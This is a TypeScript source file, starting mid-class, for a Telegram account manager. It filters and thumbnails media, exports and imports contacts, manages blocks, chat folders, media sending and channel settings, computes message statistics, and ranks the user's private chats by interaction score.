            total: allMedia.length,
        };
    }

    async getFilteredMedia(params: {
        chatId: string;
        types?: ('photo' | 'video' | 'document' | 'voice')[];
        startDate?: Date;
        endDate?: Date;
        limit?: number;
        maxId?: number;
        minId?: number;
    }) {
        if (!this.client) throw new Error('Client not initialized');

        const { chatId, types = ['photo', 'video', 'document'], startDate, endDate, limit = 50, maxId, minId } = params;

        const query: Partial<IterMessagesParams> = {
            limit: limit || 100,
            ...(maxId ? { maxId } : {}),
            ...(minId ? { minId } : {}),
            ...(startDate && { minDate: Math.floor(startDate.getTime() / 1000) }),
            ...(endDate && { maxDate: Math.floor(endDate.getTime() / 1000) })
        };

        const ent = await this.safeGetEntity(chatId);
        console.log(query);
        const messages = await this.client.getMessages(ent, query);
        console.log(`Fetched ${messages.length} messages`);

        const filteredMessages = messages.filter(message => {
            if (!message.media) return false;
            const mediaType = this.getMediaType(message.media);
            return types.includes(mediaType);
        });

        console.log(`Filtered down to ${filteredMessages.length} messages`);
        const mediaData = await Promise.all(filteredMessages.map(async (message: Api.Message) => {
            let thumbBuffer = null;

            try {
                if (message.media instanceof Api.MessageMediaPhoto) {
                    const sizes = (<Api.Photo>message.photo)?.sizes || [1];
                    thumbBuffer = await this.downloadWithTimeout(
                        this.client.downloadMedia(message, { thumb: sizes[1] || sizes[0] }) as any,
                        5000
                    );
                } else if (message.media instanceof Api.MessageMediaDocument) {
                    const sizes = message.document?.thumbs || [1];
                    thumbBuffer = await this.downloadWithTimeout(
                        this.client.downloadMedia(message, { thumb: sizes[1] || sizes[0] }) as any,
                        5000
                    );
                }
            } catch (error) {
                console.warn(`Failed to get thumbnail for message ${message.id}:`, error.message);
            }

            const mediaDetails = await this.getMediaDetails(message.media as Api.MessageMediaDocument);

            return {
                messageId: message.id,
                type: this.getMediaType(message.media),
                thumb: thumbBuffer?.toString('base64') || null,
                caption: message.message || '',
                date: message.date,
                mediaDetails,
            };
        }));

        return {
            messages: mediaData,
            total: messages.total,
            hasMore: messages.length === limit
        };
    }

    async safeGetEntity(entityId: string): Promise<Api.TypeUser | Api.TypeChat | Api.PeerChannel | null> {
        if (!this.client) throw new Error('Client not initialized');

        try {
            return await this.client.getEntity(entityId);
        } catch (error) {
            console.log(`Failed to get entity directly for ${entityId}, searching in dialogs...`);

            try {
                const dialogs = await this.client.getDialogs({
                    limit: 300
                });
                for (const dialog of dialogs) {
                    const entity = dialog.entity;
                    if (entity.id.toString() === entityId.toString()) {
                        return entity;
                    }
                }

                console.log(`Entity ${entityId} not found in dialogs either`);
                return null;
            } catch (dialogError) {
                console.error('Error while searching dialogs:', dialogError);
                return null;
            }
        }
    }

    // Contact Management Features
    private generateCSV(contacts: Array<{ firstName: string, lastName: string, phone: string, blocked: boolean }>) {
        const header = ['First Name', 'Last Name', 'Phone', 'Blocked'].join(',');
        const rows = contacts.map(contact => [
            contact.firstName,
            contact.lastName,
            contact.phone,
            contact.blocked
        ].join(','));

        return [header, ...rows].join('\n');
    }

    private generateVCard(contacts: any[]) {
        return contacts.map(contact => {
            const vcard = [
                'BEGIN:VCARD',
                'VERSION:3.0',
                `FN:${contact.firstName} ${contact.lastName || ''}`.trim(),
                `TEL;TYPE=CELL:${contact.phone || ''}`,
                'END:VCARD'
            ];
            return vcard.join('\n');
        }).join('\n\n');
    }

    async exportContacts(format: 'vcard' | 'csv', includeBlocked: boolean = false) {
        if (!this.client) throw new Error('Client not initialized');

        const contactsResult: any = await this.client.invoke(new Api.contacts.GetContacts({}));
        const contacts = contactsResult?.contacts || [];

        let blockedContacts;
        if (includeBlocked) {
            blockedContacts = await this.client.invoke(new Api.contacts.GetBlocked({
                offset: 0,
                limit: 100
            }));
        }

        if (format === 'csv') {
            const csvData = contacts.map((contact: any) => ({
                firstName: contact.firstName || '',
                lastName: contact.lastName || '',
                phone: contact.phone || '',
                blocked: blockedContacts ? blockedContacts.peers.some((p: any) =>
                    p.id.toString() === contact.id.toString()
                ) : false
            }));
            return this.generateCSV(csvData);
        } else {
            return this.generateVCard(contacts);
        }
    }

    async importContacts(data: { firstName: string; lastName?: string; phone: string }[]) {
        if (!this.client) throw new Error('Client not initialized');

        const results = await Promise.all(data.map(async contact => {
            try {
                await this.client.invoke(new Api.contacts.ImportContacts({
                    contacts: [new Api.InputPhoneContact({
                        clientId: bigInt(Math.floor(Math.random() * 1000000)),
                        phone: contact.phone,
                        firstName: contact.firstName,
                        lastName: contact.lastName || ''
                    })]
                }));
                return { success: true, phone: contact.phone };
            } catch (error) {
                return { success: false, phone: contact.phone, error: error.message };
            }
        }));

        return results;
    }

    async manageBlockList(userIds: string[], block: boolean) {
        if (!this.client) throw new Error('Client not initialized');

        const results = await Promise.all(userIds.map(async userId => {
            try {
                if (block) {
                    await this.client.invoke(new Api.contacts.Block({
                        id: await this.client.getInputEntity(userId)
                    }));
                } else {
                    await this.client.invoke(new Api.contacts.Unblock({
                        id: await this.client.getInputEntity(userId)
                    }));
                }
                return { success: true, userId };
            } catch (error) {
                return { success: false, userId, error: error.message };
            }
        }));

        return results;
    }

    async getContactStatistics() {
        if (!this.client) throw new Error('Client not initialized');

        const contactsResult: any = await this.client.invoke(new Api.contacts.GetContacts({}));
        const contacts = contactsResult?.contacts || [];

        const onlineContacts = contacts.filter((c: any) => c.status && 'wasOnline' in c.status);

        return {
            total: contacts.length,
            online: onlineContacts.length,
            withPhone: contacts.filter((c: any) => c.phone).length,
            mutual: contacts.filter((c: any) => c.mutual).length,
            lastWeekActive: onlineContacts.filter((c: any) => {
                const lastSeen = new Date(c.status.wasOnline * 1000);
                const weekAgo = new Date();
                weekAgo.setDate(weekAgo.getDate() - 7);
                return lastSeen > weekAgo;
            }).length
        };
    }

    // Chat Folder Management
    async createChatFolder(options: {
        name: string,
        includedChats: string[],
        excludedChats?: string[],
        includeContacts?: boolean,
        includeNonContacts?: boolean,
        includeGroups?: boolean,
        includeBroadcasts?: boolean,
        includeBots?: boolean,
        excludeMuted?: boolean,
        excludeRead?: boolean,
        excludeArchived?: boolean
    }) {
        if (!this.client) throw new Error('Client not initialized');

        const folder = new Api.DialogFilter({
            id: Math.floor(Math.random() * 1000),
            title: options.name,
            includePeers: await Promise.all(options.includedChats.map(id => this.client.getInputEntity(id))),
            excludePeers: await Promise.all((options.excludedChats || []).map(id => this.client.getInputEntity(id))),
            pinnedPeers: [],
            contacts: options.includeContacts ?? true,
            nonContacts: options.includeNonContacts ?? true,
            groups: options.includeGroups ?? true,
            broadcasts: options.includeBroadcasts ?? true,
            bots: options.includeBots ?? true,
            excludeMuted: options.excludeMuted ?? false,
            excludeRead: options.excludeRead ?? false,
            excludeArchived: options.excludeArchived ?? false
        });

        await this.client.invoke(new Api.messages.UpdateDialogFilter({
            id: folder.id,
            filter: folder
        }));

        return {
            id: folder.id,
            name: options.name,
            options: {
                includeContacts: folder.contacts,
                includeNonContacts: folder.nonContacts,
                includeGroups: folder.groups,
                includeBroadcasts: folder.broadcasts,
                includeBots: folder.bots,
                excludeMuted: folder.excludeMuted,
                excludeRead: folder.excludeRead,
                excludeArchived: folder.excludeArchived
            }
        };
    }

    async getChatFolders() {
        if (!this.client) throw new Error('Client not initialized');

        const filters = await this.client.invoke(new Api.messages.GetDialogFilters());
        return filters.map((filter: any) => ({
            id: filter.id ?? 0,
            title: filter.title ?? '',
            includedChatsCount: Array.isArray(filter.includePeers) ? filter.includePeers.length : 0,
            excludedChatsCount: Array.isArray(filter.excludePeers) ? filter.excludePeers.length : 0
        }));
    }

    async sendMediaBatch(options: {
        chatId: string;
        media: Array<{
            type: 'photo' | 'video' | 'document';
            url: string;
            caption?: string;
            fileName?: string;
        }>;
        silent?: boolean;
        scheduleDate?: number;
    }) {
        if (!this.client) throw new Error('Client not initialized');

        const mediaFiles = await Promise.all(
            options.media.map(async (item) => {
                const buffer = await this.downloadFileFromUrl(item.url);
                const file = new CustomFile(
                    item.fileName || `media.${this.getMediaExtension(item.type)}`,
                    buffer.length,
                    'media',
                    buffer
                );

                const uploadedFile = await this.client.uploadFile({
                    file,
                    workers: 1
                });

                const inputMedia = item.type === 'photo' ?
                    new Api.InputMediaUploadedPhoto({ file: uploadedFile }) :
                    new Api.InputMediaUploadedDocument({
                        file: uploadedFile,
                        mimeType: this.getMimeType(item.type),
                        attributes: this.getMediaAttributes(item)
                    });

                return new Api.InputSingleMedia({
                    media: inputMedia,
                    message: item.caption || '',
                    entities: []
                });
            })
        );

        return this.client.invoke(new Api.messages.SendMultiMedia({
            peer: options.chatId,
            multiMedia: mediaFiles,
            silent: options.silent,
            scheduleDate: options.scheduleDate
        }));
    }

    private getMimeType(type: string): string {
        switch (type) {
            case 'photo': return 'image/jpeg';
            case 'video': return 'video/mp4';
            case 'document': return 'application/octet-stream';
            default: return 'application/octet-stream';
        }
    }

    private getMediaAttributes(item: { type: string, fileName?: string }): Api.TypeDocumentAttribute[] {
        const attributes: Api.TypeDocumentAttribute[] = [];

        if (item.fileName) {
            attributes.push(new Api.DocumentAttributeFilename({
                fileName: item.fileName
            }));
        }

        if (item.type === 'video') {
            attributes.push(new Api.DocumentAttributeVideo({
                duration: 0,
                w: 1280,
                h: 720,
                supportsStreaming: true
            }));
        }

        return attributes;
    }

    async editMessage(options: {
        chatId: string;
        messageId: number;
        text?: string;
        media?: {
            type: 'photo' | 'video' | 'document';
            url: string;
        };
    }) {
        if (!this.client) throw new Error('Client not initialized');

        if (options.media) {
            const buffer = await this.downloadFileFromUrl(options.media.url);
            const file = new CustomFile(
                `media.${this.getMediaExtension(options.media.type)}`,
                buffer.length,
                'media',
                buffer
            );

            const uploadedFile = await this.client.uploadFile({
                file,
                workers: 1
            });

            const inputMedia = options.media.type === 'photo' ?
                new Api.InputMediaUploadedPhoto({ file: uploadedFile }) :
                new Api.InputMediaUploadedDocument({
                    file: uploadedFile,
                    mimeType: this.getMimeType(options.media.type),
                    attributes: this.getMediaAttributes(options.media)
                });

            return this.client.invoke(new Api.messages.EditMessage({
                peer: options.chatId,
                id: options.messageId,
                media: inputMedia,
                message: options.text || ''
            }));
        }

        if (options.text) {
            return this.client.invoke(new Api.messages.EditMessage({
                peer: options.chatId,
                id: options.messageId,
                message: options.text
            }));
        }

        throw new Error('Either text or media must be provided');
    }

    async getChats(options: {
        limit?: number;
        offsetDate?: number;
        offsetId?: number;
        offsetPeer?: string;
        folderId?: number;
    }) {
        if (!this.client) throw new Error('Client not initialized');

        const dialogs = await this.client.getDialogs({
            ...options,
            limit: options.limit || 100
        });

        return Promise.all(dialogs.map(async (dialog) => {
            const entity = dialog.entity;
            return {
                id: entity.id.toString(),
                title: 'title' in entity ? entity.title : null,
                username: 'username' in entity ? entity.username : null,
                type: entity instanceof Api.User ? 'user' :
                    entity instanceof Api.Chat ? 'group' :
                        entity instanceof Api.Channel ? 'channel' : 'unknown',
                unreadCount: dialog.unreadCount,
                lastMessage: dialog.message ? {
                    id: dialog.message.id,
                    text: dialog.message.message,
                    date: new Date(dialog.message.date * 1000)
                } : null
            };
        }));
    }

    async updateChatSettings(settings: {
        chatId: string;
        username?: string;
        title?: string;
        about?: string;
        photo?: string;
        slowMode?: number;
        linkedChat?: string;
        defaultSendAs?: string;
    }) {
        if (!this.client) throw new Error('Client not initialized');

        const chat = await this.client.getEntity(settings.chatId);

        const updates: Promise<any>[] = [];

        if (settings.title) {
            updates.push(this.client.invoke(new Api.channels.EditTitle({
                channel: chat,
                title: settings.title
            })));
        }

        if (settings.about) {
            updates.push(this.client.invoke(new Api.messages.EditChatAbout({
                peer: chat,
                about: settings.about
            })));
        }

        if (settings.photo) {
            const buffer = await this.downloadFileFromUrl(settings.photo);
            const file = await this.client.uploadFile({
                file: new CustomFile('photo.jpg', buffer.length, 'photo.jpg', buffer),
                workers: 1
            });

            updates.push(this.client.invoke(new Api.channels.EditPhoto({
                channel: chat,
                photo: new Api.InputChatUploadedPhoto({
                    file: file
                })
            })));
        }

        if (settings.slowMode !== undefined) {
            updates.push(this.client.invoke(new Api.channels.ToggleSlowMode({
                channel: chat,
                seconds: settings.slowMode
            })));
        }

        if (settings.linkedChat) {
            const linkedChannel = await this.client.getEntity(settings.linkedChat);
            updates.push(this.client.invoke(new Api.channels.SetDiscussionGroup({
                broadcast: chat,
                group: linkedChannel
            })));
        }

        if (settings.username) {
            updates.push(this.client.invoke(new Api.channels.UpdateUsername({
                channel: chat,
                username: settings.username
            })));
        }

        await Promise.all(updates);
        return true;
    }

    async getMessageStats(options: {
        chatId: string;
        period: 'day' | 'week' | 'month';
        fromDate?: Date;
    }) {
        if (!this.client) throw new Error('Client not initialized');

        const now = options.fromDate || new Date();
        const startDate = new Date(now);

        switch (options.period) {
            case 'day':
                startDate.setDate(startDate.getDate() - 1);
                break;
            case 'week':
                startDate.setDate(startDate.getDate() - 7);
                break;
            case 'month':
                startDate.setMonth(startDate.getMonth() - 1);
                break;
        }

        const messages = await this.client.getMessages(options.chatId, {
            limit: 100,
            offsetDate: Math.floor(now.getTime() / 1000),
        });

        const stats = {
            total: messages.length,
            withMedia: 0,
            withLinks: 0,
            withForwards: 0,
            byHour: new Array(24).fill(0),
            byType: {
                text: 0,
                photo: 0,
                video: 0,
                document: 0,
                other: 0
            }
        };

        for (const msg of messages) {
            const hour = new Date(msg.date * 1000).getHours();
            stats.byHour[hour]++;

            if (msg.media) {
                stats.withMedia++;
                const mediaType = this.getMediaType(msg.media);
                stats.byType[mediaType] = (stats.byType[mediaType] || 0) + 1;
            } else if (msg.message) {
                if (msg.message.match(/https?:\/\/[^\s]+/)) {
                    stats.withLinks++;
                }
                stats.byType.text++;
            }

            if (msg.fwdFrom) {
                stats.withForwards++;
            }
        }

        return stats;
    }

    async getTopPrivateChats(): Promise<Array<{
        chatId: string;
        username?: string;
        firstName?: string;
        lastName?: string;
        totalMessages: number;
        interactionScore: number;
        calls: {
            total: number;
            incoming: {
                total: number;
                audio: number;
                video: number;
            };
            outgoing: {
                total: number;
                audio: number;
                video: number;
            };
        };
        media: {
            photos: number;
            videos: number;
        };
        activityBreakdown: {
            videoCalls: number;
            audioCalls: number;
            mediaSharing: number;
            textMessages: number;
        };
    }>> {
        if (!this.client) throw new Error('Client not initialized');

        console.log('Starting getTopPrivateChats analysis...');
        const startTime = Date.now();

        // Weighting factors for different interaction types
        const weights = {
            videoCall: 15,      // Video calls have highest weight due to high engagement
            incoming: 5,
            outgoing: 1,       // Audio calls indicate strong connection
            sharedVideo: 6,     // Videos show high interaction intent
            sharedPhoto: 4,     // Photos show moderate interaction
            textMessage: 1,     // Base weight for messages
        };

        console.log('Fetching dialogs...');
        const dialogs = await this.client.getDialogs({
            limit: 200 // Reduced from 500 for better performance
        });
        console.log(`Found ${dialogs.length} total dialogs`);

        // Filter private chats more strictly
        const privateChats = dialogs.filter(dialog =>
            dialog.isUser &&
            dialog.entity instanceof Api.User &&
            !dialog.entity.bot && // Explicitly exclude bots
            !dialog.entity.deleted && // Exclude deleted accounts
            !dialog.entity.fake && // Exclude fake accounts
            dialog.entity.id.toString() !== "777000" && // Exclude Telegram's service notifications
            dialog.entity.id.toString() !== "42777" // Exclude Telegram's support account
        );

        console.log(`Found ${privateChats.length} valid private chats after filtering`);

        // Calculate recent activity window (last month)
        const now = Math.floor(Date.now() / 1000);
        // const oneMonthAgo = now - (30 * 24 * 60 * 60);

        // Process chats in batches to avoid overwhelming the API
        const batchSize = 10;
        const chatStats = [];
        const callLogs = await this.getCallLogsInternal();
        console.log(callLogs);
        for (let i = 0; i < privateChats.length; i += batchSize) {
            console.log(`Processing batch ${Math.floor(i / batchSize) + 1}/${Math.ceil(privateChats.length / batchSize)}`);
            const batch = privateChats.slice(i, i + batchSize);

            const batchResults = await Promise.all(batch.map(async (dialog) => {
                const processingStart = Date.now();
                const chatId = dialog.entity.id.toString();
                const user = dialog.entity as Api.User;

                console.log(`Processing chat ${chatId} (${user.firstName || 'Unknown'}) last: ${dialog.message.id}`);

                try {
                    // Get recent messages with optimization
                    const messages = await this.client.getMessages(chatId, {
                        limit: 30,
                    });

                    // Skip chats with fewer than 20 messages
                    if (messages.length < 20) {
                        console.log(`Skipping chat ${chatId} - insufficient messages (${messages.length}) | total: ${messages.total} `);
                        return null;
                    }

                    const messageStats = await this.searchMessages({ chatId, types: ["video", "photo", "document", "roundVideo"], limit: 10 });
                    console.log(`Retrieved ${messages.length} messages for chat ${chatId} | total: ${messages.total}`);

                    const callStats = {
                        total: 0,
                        incoming: 0,
                        outgoing: 0,
                        video: 0
                    };

                    const mediaStats = { photos: messageStats.photo.total, videos: messageStats?.video?.total || 0 + messageStats?.roundVideo?.total || 0 };
                    const userCalls = callLogs[chatId];
                    console.log(userCalls);
                    if (userCalls) {
                        callStats.total = userCalls.totalCalls;
                        callStats.incoming = userCalls.incoming;
                        callStats.outgoing = userCalls.outgoing;
                    }

                    // Calculate scores
                    const interactionScore = (
                        callStats.incoming * weights.incoming +
                        callStats.outgoing * weights.outgoing +
                        callStats.video * weights.videoCall +
                        mediaStats.videos * weights.sharedVideo +
                        mediaStats.photos * weights.sharedPhoto +
                        messages.total * weights.textMessage
                    )

                    // Calculate activity breakdown
                    const activityBreakdown = {
                        videoCalls: (callStats.video * weights.videoCall) / interactionScore * 100,
                        incoming: (callStats.incoming * weights.incoming) / interactionScore * 100,
                        outgoing: (callStats.outgoing * weights.outgoing) / interactionScore * 100,
                        mediaSharing: ((mediaStats.videos * weights.sharedVideo + mediaStats.photos * weights.sharedPhoto)) / interactionScore * 100,
                        textMessages: (messages.total * weights.textMessage) / interactionScore * 100
                    };

                    const processingTime = Date.now() - processingStart;
                    console.log(`Finished processing chat ${chatId} in ${processingTime}ms with interaction score: ${interactionScore}`);

                    return {
                        chatId,
                        username: user.username,
                        firstName: user.firstName,
                        lastName: user.lastName,
                        totalMessages: messages.total,
                        interactionScore: Math.round(interactionScore * 100) / 100,
                        calls: callStats,
                        media: mediaStats,
                        activityBreakdown
                    };
                } catch (error) {
                    console.error(`Error processing chat ${chatId}:`, error);
                    return null;
                }
            }));

            chatStats.push(...batchResults.filter(Boolean));
        }

        // Sort by interaction score and get top 5
        const topChats = chatStats
            .sort((a, b) => b.interactionScore - a.interactionScore)
            .slice(0, 10);

        const totalTime = Date.now() - startTime;
        console.log(`getTopPrivateChats completed in ${totalTime}ms. Found ${topChats.length} top chats`);
        topChats.forEach((chat, index) => {
            console.log(`Top ${index + 1}: ${chat.firstName} (${chat.username || 'no username'}) - Score: ${chat.interactionScore}`);
        });

        return topChats;
    }
}
export default TelegramManager;
